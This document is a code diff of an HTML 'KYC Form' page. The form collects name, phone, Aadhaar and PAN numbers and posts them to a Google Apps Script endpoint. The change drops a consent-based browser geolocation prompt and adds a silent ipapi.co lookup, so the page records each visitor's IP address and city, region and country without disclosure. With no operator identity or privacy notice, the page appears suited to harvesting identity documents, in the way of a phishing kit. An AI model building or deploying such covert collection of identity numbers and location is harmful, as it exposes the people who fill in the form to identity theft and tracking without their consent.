@@ -2,69 +2,63 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>KYC Form</title>
 </head>
 <body>
   <h2>KYC Form</h2>
   <form id="kycForm">
-    <input name="name" placeholder="Full Name" required><br>
-    <input name="phone" placeholder="Phone Number" required><br>
-    <input name="aadhaar" placeholder="Aadhaar Number" required><br>
-    <input name="pan" placeholder="PAN Number" required><br>
+    <label>Name: <input type="text" name="name" required /></label><br/><br/>
+    <label>Phone: <input type="text" name="phone" required /></label><br/><br/>
+    <label>Aadhaar: <input type="text" name="aadhaar" required /></label><br/><br/>
+    <label>PAN: <input type="text" name="pan" required /></label><br/><br/>
     <button type="submit">Submit</button>
   </form>
 
-  <p id="msg"></p>
+  <p id="message"></p>
 
   <script>
-    document.getElementById('kycForm').addEventListener('submit', async function (e) {
+    document.getElementById("kycForm").addEventListener("submit", async function (e) {
       e.preventDefault();
+
       const form = e.target;
       const data = {
         name: form.name.value,
         phone: form.phone.value,
         aadhaar: form.aadhaar.value,
         pan: form.pan.value,
+        location: "", // Placeholder
+        ip: ""        // Placeholder
       };
 
-      // Get IP address
+      // Step 1: Get Location and IP
       try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipJson = await ipRes.json();
-        data.ip = ipJson.ip;
-      } catch { data.ip = 'NA'; }
-
-      // Get Geolocation (if permitted)
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-          data.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-          await sendData(data);
-        }, async () => {
-          data.location = 'Denied';
-          await sendData(data);
-        });
-      } else {
-        data.location = 'Not supported';
-        await sendData(data);
+        const res = await fetch("https://ipapi.co/json/");
+        const locData = await res.json();
+        data.location = locData.city + ", " + locData.region + ", " + locData.country_name;
+        data.ip = locData.ip;
+      } catch (error) {
+        data.location = "Unknown";
+        data.ip = "Unknown";
       }
 
-      async function sendData(data) {
-        const msg = document.getElementById('msg');
-        try {
-          const res = await fetch('https://script.google.com/macros/s/AKfycbwU4wpciT4Qlc9Pzax4uSAcNM56G30UCbsWgRpJI3KRxIgBRugRDTcr9wXmgAbO_cBwpQ/exec', {
-            method: 'POST',
-            body: JSON.stringify(data),
-            headers: { 'Content-Type': 'application/json' }
-          });
-          const result = await res.json();
-          msg.innerText = result.status === 'success' ? 'Submitted!' : 'Error!';
-        } catch (err) {
-          msg.innerText = 'Failed to connect.';
-        }
+      // Step 2: Send to Google Sheet
+      try {
+        const response = await fetch("https://script.google.com/macros/s/AKfycbwU4wpciT4Qlc9Pzax4uSAcNM56G30UCbsWgRpJI3KRxIgBRugRDTcr9wXmgAbO_cBwpQ/exec", {
+          method: "POST",
+          body: JSON.stringify(data),
+          headers: {
+            "Content-Type": "application/json",
+          },
+        });
+
+        const text = await response.text();
+        document.getElementById("message").textContent = "Submitted successfully ✅";
+        form.reset();
+      } catch (err) {
+        document.getElementById("message").textContent = "Submission failed ❌";
       }
     });
   </script>
 </body>
 </html>
-
-
